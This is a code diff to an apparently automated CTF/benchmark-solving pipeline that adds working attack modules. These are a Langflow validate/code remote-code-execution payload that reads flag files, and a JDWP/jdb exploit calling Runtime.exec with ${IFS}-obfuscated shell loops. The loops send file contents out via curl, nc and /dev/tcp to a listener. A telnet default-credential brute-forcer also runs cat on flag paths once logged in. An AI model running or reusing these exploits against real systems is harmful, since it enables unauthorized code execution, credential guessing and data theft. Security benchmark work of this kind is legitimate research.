@@ -1378,6 +1378,17 @@ class FourPillarPipeline:
         if port in {"443", "8443"}:
             base_urls = [f"https://{addr}/", f"http://{addr}/"]
         base = base_urls[0]
+        if port in {"23", "2323"}:
+            self._benchmark_set_service_fingerprint(code, "telnet")
+            telnet_output = self._benchmark_probe_telnet_login_local(code, addr)
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code not in completed:
+                self._benchmark_mark_abandoned(
+                    code,
+                    "Telnet bounded 默认凭据/flag 路径探测未发现可提交 flag",
+                )
+            return telnet_output
         urls = [
             f"{base_url}{path}"
             for base_url in base_urls
@@ -1504,6 +1515,21 @@ class FourPillarPipeline:
                 "Dify/Next.js 前端可达但后端疑似绑定 localhost，需要 Dify 专项深挖",
             )
             return "\n".join(outputs)
+        if self._benchmark_probe_suggests_langflow(joined_outputs):
+            self._benchmark_set_service_fingerprint(code, "langflow")
+            langflow_output = self._benchmark_probe_langflow_local(code, base)
+            if langflow_output:
+                outputs.append(langflow_output)
+                joined_outputs = "\n".join(outputs)
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                return "\n".join(outputs)
+            self._benchmark_mark_abandoned(
+                code,
+                "Langflow bounded validate/code 探测未发现可提交 flag",
+            )
+            return "\n".join(outputs)
         webapp_output = self._benchmark_probe_common_webapp_flows(code, base, joined_outputs)
         if webapp_output:
             outputs.append(webapp_output)
@@ -1537,6 +1563,85 @@ class FourPillarPipeline:
                 or "x-powered-by: next.js" in lowered
             )
         )
+
+    @staticmethod
+    def _benchmark_probe_suggests_langflow(probe: str) -> bool:
+        lowered = probe.lower()
+        return (
+            "langflow" in lowered
+            and (
+                "<title>langflow</title>" in lowered
+                or '"title":"langflow"' in lowered
+                or "/api/v1/validate/code" in lowered
+                or "server: uvicorn" in lowered
+            )
+        )
+
+    def _benchmark_probe_langflow_local(self, code: str, base: str) -> str:
+        tun_interface = self._benchmark_tun_interface()
+        outputs: list[str] = [f"## langflow-probe {base}"]
+
+        for path in ("api/v1/version", "api/v1/config", "openapi.json"):
+            result = self._benchmark_curl_local(
+                _urljoin(base, path),
+                tun_interface=tun_interface,
+                timeout=8,
+            )
+            body = (result.stdout or "")[:5000]
+            outputs.append(f"## GET /{path}\n{body}\n{(result.stderr or '')[:300]}")
+            self._benchmark_auto_submit_flags_from_tool_result(
+                f"命令: langflow_probe {_urljoin(base, path)}\n"
+                "工作目录: /home/my/cyber/benchmark_test\n"
+                f"退出码: {result.returncode}\n"
+                "输出:\n"
+                f"{body}"
+            )
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                return "\n".join(outputs)
+
+        flag_paths = (
+            "/challenge/flag.txt",
+            "/flag",
+            "/flag.txt",
+            "/root/flag",
+            "/root/flag.txt",
+        )
+        for flag_path in flag_paths:
+            payload = {
+                "code": (
+                    "@exec(\"raise Exception(open("
+                    f"{flag_path!r}"
+                    ").read())\")\n"
+                    "def probe():\n"
+                    "    pass\n"
+                )
+            }
+            result = self._benchmark_curl_json_local(
+                _urljoin(base, "api/v1/validate/code"),
+                tun_interface=tun_interface,
+                method="POST",
+                payload=payload,
+                timeout=8,
+            )
+            body = result.stdout or ""
+            outputs.append(
+                f"## POST /api/v1/validate/code {flag_path}\n"
+                f"{body[:3000]}\n{(result.stderr or '')[:300]}"
+            )
+            self._benchmark_auto_submit_flags_from_tool_result(
+                f"命令: langflow_validate_code {_urljoin(base, 'api/v1/validate/code')}\n"
+                "工作目录: /home/my/cyber/benchmark_test\n"
+                f"退出码: {result.returncode}\n"
+                "输出:\n"
+                f"{body[:12000]}"
+            )
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                break
+        return "\n".join(outputs)
 
     def _benchmark_probe_dify_local(self, code: str, base: str, probe: str) -> str:
         """Run bounded Dify/Next.js checks and keep the active task for reasoning."""
@@ -1725,7 +1830,7 @@ class FourPillarPipeline:
             for port, label in ((5005, "JDWP"), (8561, "Arthas HTTP"), (8562, "Arthas telnet")):
                 reachable = self._benchmark_probe_tcp_port(host, port)
                 outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
-            jdwp_output = self._benchmark_probe_jdwp_local(host, 5005)
+            jdwp_output = self._benchmark_probe_jdwp_local(host, 5005, base)
             if jdwp_output:
                 outputs.append(jdwp_output)
                 self._benchmark_auto_submit_flags_from_tool_result(
@@ -1786,7 +1891,12 @@ class FourPillarPipeline:
         except OSError:
             return False
 
-    def _benchmark_probe_jdwp_local(self, host: str, port: int) -> str:
+    def _benchmark_probe_jdwp_local(
+        self,
+        host: str,
+        port: int,
+        trigger_base: str = "",
+    ) -> str:
         if not self._benchmark_probe_tcp_port(host, port):
             return ""
         outputs = [f"## jdwp-probe {host}:{port}", "JDWP port reachable"]
@@ -1826,7 +1936,182 @@ class FourPillarPipeline:
             )
         except Exception as exc:
             outputs.append(f"jdwp_exec_error={exc}")
+        jdb_output = self._benchmark_probe_jdwp_jdb_exfil_local(
+            host,
+            port,
+            trigger_base,
+        )
+        if jdb_output:
+            outputs.append(jdb_output)
         return "\n".join(outputs)
+
+    def _benchmark_probe_jdwp_jdb_exfil_local(
+        self,
+        host: str,
+        port: int,
+        trigger_base: str = "",
+    ) -> str:
+        """Use jdb once to trigger Runtime.exec and exfiltrate common flag paths.
+
+        This is intentionally bounded. JDWP targets are high-value, but an
+        interactive debugger can otherwise keep an easy Benchmark task alive
+        forever. If this returns no flag, the caller should prefer close/switch.
+        """
+        tun = self._benchmark_detect_tun_local()
+        if not tun:
+            return "## jdwp-jdb-exfil\nskip=no_tun_interface"
+        tun_interface, tun_ip = tun
+        if not tun_ip:
+            return "## jdwp-jdb-exfil\nskip=no_tun_ip"
+
+        listener = socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM)
+        listener.setsockopt(socket_mod.SOL_SOCKET, socket_mod.SO_REUSEADDR, 1)
+        try:
+            listener.bind((tun_ip, 0))
+            listener.listen(2)
+            listener.settimeout(18)
+            listen_port = int(listener.getsockname()[1])
+        except OSError as exc:
+            listener.close()
+            return f"## jdwp-jdb-exfil\nlistener_error={exc}"
+
+        received: list[bytes] = []
+
+        def accept_once() -> None:
+            try:
+                conn, _addr = listener.accept()
+                with conn:
+                    conn.settimeout(2)
+                    chunks: list[bytes] = []
+                    while True:
+                        try:
+                            chunk = conn.recv(4096)
+                        except OSError:
+                            break
+                        if not chunk:
+                            break
+                        chunks.append(chunk)
+                        if sum(len(part) for part in chunks) > 65536:
+                            break
+                    received.append(b"".join(chunks))
+            except OSError:
+                return
+            finally:
+                try:
+                    listener.close()
+                except OSError:
+                    pass
+
+        accept_thread = threading.Thread(target=accept_once, daemon=True)
+        accept_thread.start()
+
+        flag_paths = (
+            "/flag",
+            "/flag.txt",
+            "/root/flag",
+            "/root/flag.txt",
+            "/tmp/flag",
+            "/tmp/flag.txt",
+            "/home/flag",
+            "/home/flag.txt",
+            "/hugegraph-server/flag",
+            "/hugegraph-server/flag.txt",
+        )
+        path_list = "${IFS}".join(flag_paths)
+        file_loop = (
+            f"for${{IFS}}f${{IFS}}in${{IFS}}{path_list};"
+            "do${IFS}[${IFS}-r${IFS}$f${IFS}]&&cat${IFS}$f;"
+            "done"
+        )
+        callbacks = (
+            f"{file_loop}|curl${{IFS}}-m${{IFS}}3${{IFS}}-sS${{IFS}}-XPOST"
+            f"${{IFS}}--data-binary${{IFS}}@-${{IFS}}http://{tun_ip}:{listen_port}/",
+            f"{file_loop}|nc${{IFS}}{tun_ip}${{IFS}}{listen_port}",
+            f"{file_loop}>/dev/tcp/{tun_ip}/{listen_port}",
+        )
+        commands = [
+            "stop in java.lang.String.indexOf(java.lang.String)",
+            "stop in java.lang.String.equals(java.lang.Object)",
+        ]
+        commands.extend(
+            f'print java.lang.Runtime.getRuntime().exec("/bin/sh -c {payload}")'
+            for payload in callbacks
+        )
+        commands.append("cont")
+        commands.append("quit")
+
+        proc: subprocess.Popen[str] | None = None
+        trigger_stdout = ""
+        trigger_stderr = ""
+        jdb_output = ""
+        try:
+            proc = subprocess.Popen(
+                ["jdb", "-attach", f"{host}:{port}"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+            )
+            time_mod.sleep(1.5)
+            if proc.stdin is not None:
+                proc.stdin.write(commands[0] + "\n")
+                proc.stdin.write(commands[1] + "\n")
+                proc.stdin.flush()
+            trigger_url = _urljoin(trigger_base or f"http://{host}:8080/", "versions")
+            trigger = subprocess.run(
+                [
+                    "curl",
+                    "-sS",
+                    "--interface",
+                    tun_interface,
+                    "--connect-timeout",
+                    "2",
+                    "--max-time",
+                    "5",
+                    trigger_url,
+                ],
+                check=False,
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=7,
+            )
+            trigger_stdout = trigger.stdout[:300]
+            trigger_stderr = trigger.stderr[:300]
+            time_mod.sleep(1.5)
+            if proc.stdin is not None:
+                for command in commands[2:]:
+                    proc.stdin.write(command + "\n")
+                    proc.stdin.flush()
+                    time_mod.sleep(0.2)
+            try:
+                jdb_output, _ = proc.communicate(timeout=6)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                jdb_output, _ = proc.communicate(timeout=3)
+        except Exception as exc:
+            if proc is not None:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+            return f"## jdwp-jdb-exfil\nerror={exc}"
+        finally:
+            try:
+                listener.close()
+            except OSError:
+                pass
+
+        accept_thread.join(timeout=1)
+        callback_text = b"\n".join(received).decode("utf-8", errors="replace")
+        return (
+            "## jdwp-jdb-exfil\n"
+            f"listener={tun_ip}:{listen_port}\n"
+            f"trigger_stdout={trigger_stdout}\n"
+            f"trigger_stderr={trigger_stderr}\n"
+            f"callback={callback_text[:4000]}\n"
+            f"jdb={jdb_output[:4000]}"
+        )
 
     def _benchmark_probe_common_webapp_flows(self, code: str, base: str, probe: str) -> str:
         """Follow common benchmark web-app clues that need cookies or state.
@@ -2135,6 +2420,132 @@ class FourPillarPipeline:
                 metadata={"challenge": code},
             )
         return output
+
+    @staticmethod
+    def _benchmark_telnet_plain_and_reply(data: bytes) -> tuple[str, bytes]:
+        iac = 255
+        dont = 254
+        do = 253
+        wont = 252
+        will = 251
+        output = bytearray()
+        reply = bytearray()
+        index = 0
+        while index < len(data):
+            byte = data[index]
+            if byte == iac and index + 2 < len(data):
+                command = data[index + 1]
+                option = data[index + 2]
+                if command == do:
+                    reply.extend((iac, wont, option))
+                elif command == will:
+                    reply.extend((iac, dont, option))
+                index += 3
+                continue
+            output.append(byte)
+            index += 1
+        return output.decode("utf-8", errors="replace"), bytes(reply)
+
+    def _benchmark_telnet_recv(self, sock: socket_mod.socket, seconds: float) -> str:
+        deadline = time_mod.monotonic() + seconds
+        text = ""
+        while time_mod.monotonic() < deadline:
+            try:
+                data = sock.recv(4096)
+            except TimeoutError:
+                continue
+            except OSError:
+                break
+            if not data:
+                break
+            plain, reply = self._benchmark_telnet_plain_and_reply(data)
+            if reply:
+                try:
+                    sock.sendall(reply)
+                except OSError:
+                    break
+            text += plain
+            if _re_mod.search(
+                r"(login:|password:|[$#>]\s*$|flag\{)",
+                text,
+                _re_mod.IGNORECASE,
+            ):
+                break
+        return text
+
+    def _benchmark_probe_telnet_login_local(self, code: str, addr: str) -> str:
+        host, port_text = addr.rsplit(":", 1)
+        try:
+            port = int(port_text)
+        except ValueError:
+            return f"## telnet-login {addr}\nERROR: invalid port"
+
+        detected = self._benchmark_detect_tun_local()
+        source_ip = detected[1] if detected else ""
+        credentials = (
+            ("root", "root"),
+            ("root", "password"),
+            ("root", "toor"),
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("user", "user"),
+            ("guest", "guest"),
+            ("ctf", "ctf"),
+            ("test", "test"),
+        )
+        flag_command = (
+            "cat /challenge/flag.txt /flag /flag.txt /root/flag "
+            "/root/flag.txt 2>/dev/null\n"
+        )
+        outputs: list[str] = [f"## telnet-login {addr}"]
+        for username, password in credentials:
+            session_text = ""
+            try:
+                with socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM) as sock:
+                    if source_ip:
+                        try:
+                            sock.bind((source_ip, 0))
+                        except OSError:
+                            pass
+                    sock.settimeout(3)
+                    sock.connect((host, port))
+                    sock.settimeout(0.4)
+                    session_text += self._benchmark_telnet_recv(sock, 1.5)
+                    if "login:" not in session_text.lower():
+                        sock.sendall(b"\r\n")
+                        session_text += self._benchmark_telnet_recv(sock, 1.0)
+                    sock.sendall(f"{username}\r\n".encode("utf-8"))
+                    session_text += self._benchmark_telnet_recv(sock, 1.0)
+                    sock.sendall(f"{password}\r\n".encode("utf-8"))
+                    session_text += self._benchmark_telnet_recv(sock, 2.0)
+                    logged_in = (
+                        "login incorrect" not in session_text.lower()
+                        and (
+                            bool(_re_mod.search(r"[$#>]\s*$", session_text))
+                            or "last login:" in session_text.lower()
+                            or f"{username}@" in session_text.lower()
+                        )
+                    )
+                    if logged_in:
+                        sock.sendall(flag_command.encode("utf-8"))
+                        session_text += self._benchmark_telnet_recv(sock, 3.0)
+            except OSError as exc:
+                session_text += f"\nERROR: {exc}"
+            outputs.append(
+                f"## credential {username}/{password}\n{session_text[-2500:]}"
+            )
+            self._benchmark_auto_submit_flags_from_tool_result(
+                f"命令: telnet_login_probe {addr} {username}/{password}\n"
+                "工作目录: /home/my/cyber/benchmark_test\n"
+                "退出码: 0\n"
+                "输出:\n"
+                f"{session_text}"
+            )
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed or "flag{" in session_text.lower():
+                break
+        return "\n".join(outputs)
 
     def _benchmark_probe_handoff_followup_local(self, code: str, addrs: list[str]) -> str:
         if not addrs:
@@ -2488,6 +2899,46 @@ class FourPillarPipeline:
             if code in completed:
                 return f"确定性 Dify close：{code} 已完成，close 返回: {closed[:200]}"
             return f"确定性 Dify close：{code} 已 close 释放资源: {closed[:300]}"
+        if "Benchmark hugegraph exploit step 2" in desc:
+            code, addrs = self._benchmark_active_challenge_from_state()
+            if not code:
+                return "确定性 HugeGraph exploit：当前没有 active 容器，跳过。"
+            if not addrs:
+                return "确定性 HugeGraph exploit：当前 active 容器无地址，跳过。"
+            addr = addrs[0]
+            if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
+                return f"确定性 HugeGraph exploit：容器地址格式异常: {addr}"
+            base = f"http://{addr}/"
+            self._benchmark_set_service_fingerprint(code, "hugegraph")
+            probe = self._benchmark_probe_hugegraph_local(code, base, "")
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                closed = self._benchmark_close_local(code)
+                return (
+                    f"确定性 HugeGraph exploit：{code} 已提交成功并关闭。\n"
+                    f"close 返回: {closed[:200]}\n探测摘要:\n{probe[:3000]}"
+                )
+            self._benchmark_mark_abandoned(
+                code,
+                "HugeGraph/JDWP bounded exploit 未发现可提交 flag",
+            )
+            return (
+                f"确定性 HugeGraph exploit：{code} 已完成 bounded HugeGraph/Gremlin/"
+                "Arthas/JDWP 探测，未发现 flag/可提交候选；为最大化总分，"
+                "标记 abandoned，下一步 close 换题。\n"
+                f"探测摘要:\n{probe[:3500]}"
+            )
+        if "Benchmark hugegraph close step 3" in desc:
+            code, _addrs = self._benchmark_active_challenge_from_state()
+            if not code:
+                return "确定性 HugeGraph close：当前没有 active 容器，无需 close。"
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            closed = self._benchmark_close_local(code)
+            if code in completed:
+                return f"确定性 HugeGraph close：{code} 已完成，close 返回: {closed[:200]}"
+            return f"确定性 HugeGraph close：{code} 已 close 释放资源: {closed[:300]}"
         if "Benchmark handoff step 1" in desc:
             code, addrs = self._benchmark_active_challenge_from_state()
             if not code:
@@ -6418,6 +6869,8 @@ class FourPillarPipeline:
                     deterministic_result: str | None = None
                     if (
                         "Benchmark handoff step" in desc
+                        or "Benchmark hugegraph exploit step" in desc
+                        or "Benchmark hugegraph close step" in desc
                         or "Benchmark dify handoff step" in desc
                         or "Benchmark dify exploit step" in desc
                         or "Benchmark dify close step" in desc
